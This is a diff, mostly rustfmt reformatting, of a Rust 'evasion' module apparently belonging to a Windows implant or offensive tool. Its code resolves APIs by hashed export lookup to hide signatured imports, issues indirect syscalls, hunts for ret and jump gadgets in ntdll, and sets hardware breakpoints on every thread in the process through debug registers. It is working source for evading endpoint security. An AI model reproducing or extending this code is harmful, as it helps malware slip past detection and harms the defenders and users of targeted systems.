@@ -79,7 +79,10 @@ pub unsafe fn setup_hardware_breakpoints() {
     // runtime via PE export-table hashing so no import-table entries are
     // created for these heavily-signatured APIs.
 
-    type AddVehFn = unsafe extern "system" fn(u32, Option<unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32>) -> *mut std::ffi::c_void;
+    type AddVehFn = unsafe extern "system" fn(
+        u32,
+        Option<unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32>,
+    ) -> *mut std::ffi::c_void;
 
     let add_veh: Option<AddVehFn> = (|| unsafe {
         let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
@@ -89,10 +92,20 @@ pub unsafe fn setup_hardware_breakpoints() {
     })();
 
     type CreateSnapshotFn = unsafe extern "system" fn(u32, u32) -> winapi::um::winnt::HANDLE;
-    type Thread32FirstFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
-    type Thread32NextFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut winapi::um::tlhelp32::THREADENTRY32) -> i32;
+    type Thread32FirstFn = unsafe extern "system" fn(
+        winapi::um::winnt::HANDLE,
+        *mut winapi::um::tlhelp32::THREADENTRY32,
+    ) -> i32;
+    type Thread32NextFn = unsafe extern "system" fn(
+        winapi::um::winnt::HANDLE,
+        *mut winapi::um::tlhelp32::THREADENTRY32,
+    ) -> i32;
 
-    let (create_snapshot, thread32_first, thread32_next): (Option<CreateSnapshotFn>, Option<Thread32FirstFn>, Option<Thread32NextFn>) = match (|| unsafe {
+    let (create_snapshot, thread32_first, thread32_next): (
+        Option<CreateSnapshotFn>,
+        Option<Thread32FirstFn>,
+        Option<Thread32NextFn>,
+    ) = match (|| unsafe {
         let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
         let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
         let first_hash = pe_resolve::hash_str(b"Thread32First\0");
@@ -193,21 +206,22 @@ pub unsafe fn setup_hardware_breakpoints() {
                 let mut return_len: usize = 0;
                 let vq_status = crate::syscall!(
                     "NtQueryVirtualMemory",
-                    -1i64 as u64,                          // NtCurrentProcess()
-                    p as u64,                               // BaseAddress
-                    0u64,                                   // MemoryBasicInformation
-                    &mut mbi as *mut _ as u64,              // Buffer
+                    -1i64 as u64,              // NtCurrentProcess()
+                    p as u64,                  // BaseAddress
+                    0u64,                      // MemoryBasicInformation
+                    &mut mbi as *mut _ as u64, // Buffer
                     std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
-                    &mut return_len as *mut _ as u64,       // ReturnLength
+                    &mut return_len as *mut _ as u64, // ReturnLength
                 );
-                if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT
-                {
+                if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT {
                     break 'gadget;
                 }
 
                 if *p == 0xFF && *p.add(1) == 0x25 {
                     let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
-                    let slot = (p as usize).wrapping_add(6).wrapping_add(disp as isize as usize);
+                    let slot = (p as usize)
+                        .wrapping_add(6)
+                        .wrapping_add(disp as isize as usize);
                     let target = std::ptr::read_unaligned(slot as *const usize);
                     if target == 0 {
                         break 'gadget;
@@ -215,8 +229,9 @@ pub unsafe fn setup_hardware_breakpoints() {
                     p = target as *const u8;
                 } else if *p == 0xE9 {
                     let disp = std::ptr::read_unaligned(p.add(1) as *const i32);
-                    let target =
-                        (p as usize).wrapping_add(5).wrapping_add(disp as isize as usize);
+                    let target = (p as usize)
+                        .wrapping_add(5)
+                        .wrapping_add(disp as isize as usize);
                     if target == 0 {
                         break 'gadget;
                     }
@@ -238,15 +253,14 @@ pub unsafe fn setup_hardware_breakpoints() {
                     let mut return_len: usize = 0;
                     let vq_status = crate::syscall!(
                         "NtQueryVirtualMemory",
-                        -1i64 as u64,                          // NtCurrentProcess()
-                        p as u64,                               // BaseAddress
-                        0u64,                                   // MemoryBasicInformation
-                        &mut mbi as *mut _ as u64,              // Buffer
+                        -1i64 as u64,              // NtCurrentProcess()
+                        p as u64,                  // BaseAddress
+                        0u64,                      // MemoryBasicInformation
+                        &mut mbi as *mut _ as u64, // Buffer
                         std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
-                        &mut return_len as *mut _ as u64,       // ReturnLength
+                        &mut return_len as *mut _ as u64, // ReturnLength
                     );
-                    if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT
-                    {
+                    if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT {
                         break 'gadget;
                     }
                     // Require at least PAGE_EXECUTE_READ.
@@ -306,9 +320,7 @@ pub unsafe fn setup_hardware_breakpoints() {
                         if *q.add(i) == 0xC3 {
                             let gadget = peb_fn + i;
                             // Verify it's within ntdll (should always be).
-                            if ntdll_end == 0
-                                || (gadget >= ntdll_base && gadget < ntdll_end)
-                            {
+                            if ntdll_end == 0 || (gadget >= ntdll_base && gadget < ntdll_end) {
                                 RET_GADGET.store(gadget, Ordering::Relaxed);
                                 log::debug!(
                                     "evasion: ret gadget fallback from RtlGetCurrentPeb at {:#x}",
@@ -359,7 +371,7 @@ pub unsafe fn setup_hardware_breakpoints() {
     let _ = crate::syscall!(
         "NtQueryInformationProcess",
         (-1isize) as u64, // NtCurrentProcess()
-        0u64,              // ProcessBasicInformation
+        0u64,             // ProcessBasicInformation
         &mut pbi as *mut _ as u64,
         std::mem::size_of::<Pbi>() as u64,
         std::ptr::null_mut::<u64>() as u64,
@@ -376,7 +388,8 @@ pub unsafe fn setup_hardware_breakpoints() {
                 if te32.th32OwnerProcessID == pid {
                     // OpenThread → NtOpenThread (indirect syscall)
                     let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-                    oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                    oa.Length =
+                        std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
                     let mut cid: [u64; 2] = [pid as u64, te32.th32ThreadID as u64];
                     let mut h_thread: usize = 0;
                     let open_ok = crate::syscall!(
@@ -410,47 +423,51 @@ pub unsafe fn setup_hardware_breakpoints() {
                         // (5) Save original context for restoration on error.
                         let mut orig_ctx: CONTEXT = std::mem::zeroed();
                         orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-                            let got_ctx_fallback = {
-                                let s = crate::syscall!(
-                                    "NtGetContextThread",
-                                    h_thread as u64,
-                                    &mut orig_ctx as *mut _ as u64,
-                                );
-                                s.is_ok() && s.unwrap() >= 0
-                            };
-                            let _orig_saved = if let Some(nt_get_ctx) = nt_get_context_thread {
-                                let status = nt_get_ctx(h_thread, &mut orig_ctx);
-                                if status >= 0 { true } else { got_ctx_fallback }
+                        let got_ctx_fallback = {
+                            let s = crate::syscall!(
+                                "NtGetContextThread",
+                                h_thread as u64,
+                                &mut orig_ctx as *mut _ as u64,
+                            );
+                            s.is_ok() && s.unwrap() >= 0
+                        };
+                        let _orig_saved = if let Some(nt_get_ctx) = nt_get_context_thread {
+                            let status = nt_get_ctx(h_thread, &mut orig_ctx);
+                            if status >= 0 {
+                                true
                             } else {
                                 got_ctx_fallback
-                            };
+                            }
+                        } else {
+                            got_ctx_fallback
+                        };
 
                         // (2) GetThreadContext: returns 0 on failure.
                         let mut ctx: CONTEXT = std::mem::zeroed();
                         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                         let ctx_fallback = {
-                                let s = crate::syscall!(
-                                    "NtGetContextThread",
-                                    h_thread as u64,
-                                    &mut ctx as *mut _ as u64,
-                                );
-                                s.is_ok() && s.unwrap() >= 0
-                            };
-                            let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
-                                let status = nt_get_ctx(h_thread, &mut ctx);
-                                if status >= 0 {
-                                    true
-                                } else {
-                                    log::warn!(
+                            let s = crate::syscall!(
+                                "NtGetContextThread",
+                                h_thread as u64,
+                                &mut ctx as *mut _ as u64,
+                            );
+                            s.is_ok() && s.unwrap() >= 0
+                        };
+                        let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
+                            let status = nt_get_ctx(h_thread, &mut ctx);
+                            if status >= 0 {
+                                true
+                            } else {
+                                log::warn!(
                                         "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
                                         te32.th32ThreadID,
                                         status as u32
                                     );
-                                    ctx_fallback
-                                }
-                            } else {
                                 ctx_fallback
-                            };
+                            }
+                        } else {
+                            ctx_fallback
+                        };
 
                         if !got_context {
                             log::warn!(
@@ -473,52 +490,57 @@ pub unsafe fn setup_hardware_breakpoints() {
                         ctx.Dr7 |= (1 << 0) | (1 << 2);
 
                         let set_fallback = {
-                                let s = crate::syscall!(
-                                    "NtSetContextThread",
-                                    h_thread as u64,
-                                    &mut ctx as *mut _ as u64,
-                                );
-                                s.is_ok() && s.unwrap() >= 0
-                            };
-                            let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
-                                let status = nt_set_ctx(h_thread, &mut ctx);
-                                if status < 0 {
-                                    log::warn!(
+                            let s = crate::syscall!(
+                                "NtSetContextThread",
+                                h_thread as u64,
+                                &mut ctx as *mut _ as u64,
+                            );
+                            s.is_ok() && s.unwrap() >= 0
+                        };
+                        let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
+                            let status = nt_set_ctx(h_thread, &mut ctx);
+                            if status < 0 {
+                                log::warn!(
                                         "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
                                         te32.th32ThreadID,
                                         status as u32
                                     );
-                                    set_fallback
-                                } else {
-                                    true
-                                }
-                            } else {
                                 set_fallback
-                            };
+                            } else {
+                                true
+                            }
+                        } else {
+                            set_fallback
+                        };
 
                         // (3) Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
                         if set_ok {
                             let mut verify_ctx: CONTEXT = std::mem::zeroed();
                             verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                             let verify_fallback = {
-                                    let s = crate::syscall!(
-                                        "NtGetContextThread",
-                                        h_thread as u64,
-                                        &mut verify_ctx as *mut _ as u64,
-                                    );
-                                    s.is_ok() && s.unwrap() >= 0
-                                };
-                                let verify_ok = if let Some(nt_get_ctx) = nt_get_context_thread {
-                                    let status = nt_get_ctx(h_thread, &mut verify_ctx);
-                                    if status >= 0 { true } else { verify_fallback }
+                                let s = crate::syscall!(
+                                    "NtGetContextThread",
+                                    h_thread as u64,
+                                    &mut verify_ctx as *mut _ as u64,
+                                );
+                                s.is_ok() && s.unwrap() >= 0
+                            };
+                            let verify_ok = if let Some(nt_get_ctx) = nt_get_context_thread {
+                                let status = nt_get_ctx(h_thread, &mut verify_ctx);
+                                if status >= 0 {
+                                    true
                                 } else {
                                     verify_fallback
-                                };
+                                }
+                            } else {
+                                verify_fallback
+                            };
 
                             if !verify_ok
                                 || verify_ctx.Dr0 != ctx.Dr0
                                 || verify_ctx.Dr1 != ctx.Dr1
-                                || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2))) != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
+                                || (verify_ctx.Dr7 & ((1 << 0) | (1 << 2)))
+                                    != (ctx.Dr7 & ((1 << 0) | (1 << 2)))
                             {
                                 log::warn!(
                                     "evasion: SetThreadContext verification failed for tid {} — Dr0={:#x} (expected {:#x}), Dr1={:#x} (expected {:#x}), restoring original context",
@@ -536,7 +558,11 @@ pub unsafe fn setup_hardware_breakpoints() {
                                             h_thread as u64,
                                             &mut orig_ctx as *mut _ as u64,
                                         );
-                                        if s.is_ok() && s.unwrap() >= 0 { 0i32 } else { -1i32 }
+                                        if s.is_ok() && s.unwrap() >= 0 {
+                                            0i32
+                                        } else {
+                                            -1i32
+                                        }
                                     };
                                 }
                             }
@@ -548,7 +574,8 @@ pub unsafe fn setup_hardware_breakpoints() {
                         }
 
                         // (4) ResumeThread → NtResumeThread
-                        let resume_status = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
+                        let resume_status =
+                            crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
                         if resume_status.is_err() || resume_status.unwrap() < 0 {
                             log::error!(
                                 "evasion: NtResumeThread failed for tid {} — thread may be left in suspended state!",
@@ -668,20 +695,14 @@ pub unsafe fn apply_hwbp_to_current_thread() {
 
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
     let nt_get_ctx: Option<NtGetContextThreadFn> = if ntdll != 0 {
-        pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtGetContextThread\0"),
-        )
-        .map(|a| std::mem::transmute(a))
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
+            .map(|a| std::mem::transmute(a))
     } else {
         None
     };
     let nt_set_ctx: Option<NtSetContextThreadFn> = if ntdll != 0 {
-        pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtSetContextThread\0"),
-        )
-        .map(|a| std::mem::transmute(a))
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
+            .map(|a| std::mem::transmute(a))
     } else {
         None
     };
@@ -703,12 +724,22 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     let orig_saved = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut orig_ctx);
-        if status >= 0 { true } else {
-            let s = crate::syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+        if status >= 0 {
+            true
+        } else {
+            let s = crate::syscall!(
+                "NtGetContextThread",
+                h as u64,
+                &mut orig_ctx as *mut _ as u64
+            );
             s.is_ok() && s.unwrap() >= 0
         }
     } else {
-        let s = crate::syscall!("NtGetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
+        let s = crate::syscall!(
+            "NtGetContextThread",
+            h as u64,
+            &mut orig_ctx as *mut _ as u64
+        );
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -772,12 +803,22 @@ pub unsafe fn apply_hwbp_to_current_thread() {
     verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     let verify_ok = if let Some(nt_get) = nt_get_ctx {
         let status = nt_get(h, &mut verify_ctx);
-        if status >= 0 { true } else {
-            let s = crate::syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
+        if status >= 0 {
+            true
+        } else {
+            let s = crate::syscall!(
+                "NtGetContextThread",
+                h as u64,
+                &mut verify_ctx as *mut _ as u64
+            );
             s.is_ok() && s.unwrap() >= 0
         }
     } else {
-        let s = crate::syscall!("NtGetContextThread", h as u64, &mut verify_ctx as *mut _ as u64);
+        let s = crate::syscall!(
+            "NtGetContextThread",
+            h as u64,
+            &mut verify_ctx as *mut _ as u64
+        );
         s.is_ok() && s.unwrap() >= 0
     };
 
@@ -796,8 +837,16 @@ pub unsafe fn apply_hwbp_to_current_thread() {
             let _ = if let Some(nt_set) = nt_set_ctx {
                 nt_set(h, &mut orig_ctx)
             } else {
-                let s = crate::syscall!("NtSetContextThread", h as u64, &mut orig_ctx as *mut _ as u64);
-                if s.is_ok() && s.unwrap() >= 0 { 0i32 } else { -1i32 }
+                let s = crate::syscall!(
+                    "NtSetContextThread",
+                    h as u64,
+                    &mut orig_ctx as *mut _ as u64
+                );
+                if s.is_ok() && s.unwrap() >= 0 {
+                    0i32
+                } else {
+                    -1i32
+                }
             };
         }
     }
@@ -883,17 +932,13 @@ unsafe fn save_and_clear_debug_regs() -> SavedDebugRegs {
     type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
     type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
 
-    let nt_get: Option<NtGetCtxFn> = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"NtGetContextThread\0"),
-    )
-    .map(|a| std::mem::transmute(a));
+    let nt_get: Option<NtGetCtxFn> =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
+            .map(|a| std::mem::transmute(a));
 
-    let nt_set: Option<NtSetCtxFn> = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"NtSetContextThread\0"),
-    )
-    .map(|a| std::mem::transmute(a));
+    let nt_set: Option<NtSetCtxFn> =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
+            .map(|a| std::mem::transmute(a));
 
     let h = (-1isize) as winapi::um::winnt::HANDLE; // NtCurrentThread()
 
@@ -950,11 +995,9 @@ unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
 
     type NtSetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
 
-    let nt_set: Option<NtSetCtxFn> = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"NtSetContextThread\0"),
-    )
-    .map(|a| std::mem::transmute(a));
+    let nt_set: Option<NtSetCtxFn> =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetContextThread\0"))
+            .map(|a| std::mem::transmute(a));
 
     let h = (-1isize) as winapi::um::winnt::HANDLE;
 
@@ -963,11 +1006,9 @@ unsafe fn restore_debug_regs(saved: SavedDebugRegs) {
 
     // Get current context to preserve Dr7 settings.
     type NtGetCtxFn = unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
-    let nt_get: Option<NtGetCtxFn> = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"NtGetContextThread\0"),
-    )
-    .map(|a| std::mem::transmute(a));
+    let nt_get: Option<NtGetCtxFn> =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtGetContextThread\0"))
+            .map(|a| std::mem::transmute(a));
 
     let got = if let Some(nt_get_fn) = nt_get {
         nt_get_fn(h, &mut ctx) >= 0
